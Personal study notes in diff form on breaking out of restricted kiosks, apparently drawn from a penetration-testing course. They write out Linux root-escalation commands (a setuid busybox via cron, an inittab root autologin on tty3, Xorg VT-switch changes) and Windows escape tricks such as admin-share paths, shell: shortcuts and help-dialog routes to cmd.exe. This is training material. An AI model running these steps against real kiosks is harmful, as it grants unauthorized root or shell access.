@@ -221,4 +221,137 @@ echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
 echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
 ```
 
+```
+/home/guest/busybox sh command_to_run
+```
+
+Listing 525 - Busybox syntax
+Trying to call gtkdialog directly using this method doesn’t seem to work. We receive no 
+response in our terminal and no gtkdialog window is displayed. It’s possible this has to do with 
+the way the commands are being interpreted by the gtkdialog action and passed to the shell but 
+since we don’t receive any output or errors, it’s difficult to know.
+To get around this, we’ll create a runterminal.sh script with Scratchpad that will launch our 
+terminal:
+
+```
+#!/bin/bash
+/usr/bin/gtkdialog -f /home/guest/terminal.txt
+```
+
+Listing 526 - Script to fire a terminal
+Then, we’ll execute it with busybox:
+```
+/home/guest/busybox sh /home/guest/runterminal.sh
+```
+
+# getting root terminal access
+
+wew can look at ttys terminals in linux desktops
+xdotool key Ctrl + Alt + F3
+
+/usr/bin/xdotool to programatically send keyboard shortcuts via the command line and verify that the shortcuts are actually being delivered to the X windows environment
+
+howver we may need to restart which may activate "self healing" of kisol environment
+
+Inspection of the /etc/X11/xorg.conf.d/10-xorg.conf configuration file reveals that 
+“DontVTSwitch” is uncommented, which means VT switching is disabled.662 VT switching refers 
+to the ability to switch dynamically between virtual terminal663 interfaces.
+To modify this, we’ll copy the original file from /etc/X11/xorg.conf.d/10-xorg.conf to a temporary 
+file in our home folder, /home/guest/xorg.txt:
+cp /etc/X11/xorg.conf.d/10-xorg.conf /home/guest/xorg.txt
+Listing 529 - Copying the Xorg configuration file
+Then we’ll adjust the permissions so we can edit it in Scratchpad:
+chmod 777 /home/guest/xorg.tx
+
+We can then save the file and copy it back to its original location:
+cp /home/guest/xorg.txt /etc/X11/xorg.conf.d/10-xorg.conf 
+Listing 531 - Copying the Xorg configuration file back
+Then we’ll change the permissions back to their original state:
+chmod 644 /etc/X11/xorg.conf.d/10-xorg.conf
+
+`cp /etc/inittab /home/guest/inittab.txt`
+
+`chmod 777 /home/guest/inittab.txt`
+
+adding to tty
+
+`c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linu`
+
+```
+#!/bin/bash
+killall x11vnc 
+x11vnc -rawfb vt
+```
+
+### 11.4.3.1 Exercises
+1. Determine which locations we can write to as a normal user. 
+2. Get a list of root-owned processes running on the system and determine their purpose/use.
+3. What cron jobs are running on the system currently?
+4. Try to determine the mechanism by which the kiosk refresh scripts are replacing 
+bookmarks.html. Why does it only work when setting a symlink to a directory and not just 
+pointing to the bookmarks.html file instead?
+
+# Windows Kiosk breakout techniques
+
+we can try and use environemnt variables to reach restricted lace
+
+%APPDATA%
+
+%ALLUSERSPROFILE% C:\Documents and Settings\All Users
+%APPDATA% C:\Documents and Settings\Username\Application Data
+%COMMONPROGRAMFILES% C:\Program Files\Common Files
+%COMMONPROGRAMFILES(x86)% C:\Program Files (x86)\Common Files
+%COMSPEC% C:\Windows\System32\cmd.exe
+%HOMEDRIVE% C:\
+%HOMEPATH% C:\Documents and Settings\Username
+%PROGRAMFILES% C:\Program Files
+
+%PROGRAMFILES(X86)% C:\Program Files (x86) (only in 64-bit version)
+%SystemDrive% C:\
+%SystemRoot% C:\Windows
+%TEMP% and %TMP% C:\Documents and Settings\Username\Local 
+Settings\Temp
+%USERPROFILE% C:\Documents and Settings\Username
+%WINDIR% C:\Windows
+
+Specifically, we may be restricted from accessing C:\Windows\System32, but 
+\\127.0.0.1\C$\Windows\System32\ may be allowed
+
+Windows also allows the use of the “shell:” shortcut667 in file browser dialogs to provide access to 
+certain folders
+
+```
+Command Action
+shell:System Opens the system folder
+shell:Common Start Menu Opens the Public Start Menu folder
+shell:Downloads Opens the current user’s Downloads folder
+shell:MyComputerFolder Opens the “This PC” window, showing devices and drives for the 
+system
+```
+
+We may also be able to use other browser-protocol style shortcuts such as file:/// to access 
+applications or to access files that may open an application.
+
+it may also be possible ot search a file we cant access directly
+
+from help windows also we may get access to command prompt
+
+we can also create shortcuts and then modify shortcuts to access cmd.exe and powershell.exe
+
+print dialog
+
+ctrl alt del
+
+Key Menu/Application
+! Help
+C+P Print Dialog
+E+A Task Switcher
+G+R Run menu
+C+~ Start Menu
+
+### 11.5.1.1 Exercises
+1. Using Notepad on a Windows machine, open the help dialog and search for different utilities 
+that might expand our capabilities in a restricted environment. Expand on the examples in 
+this section to get a direct link through the help pages to open an application. What 
+applications are available via this method?
 
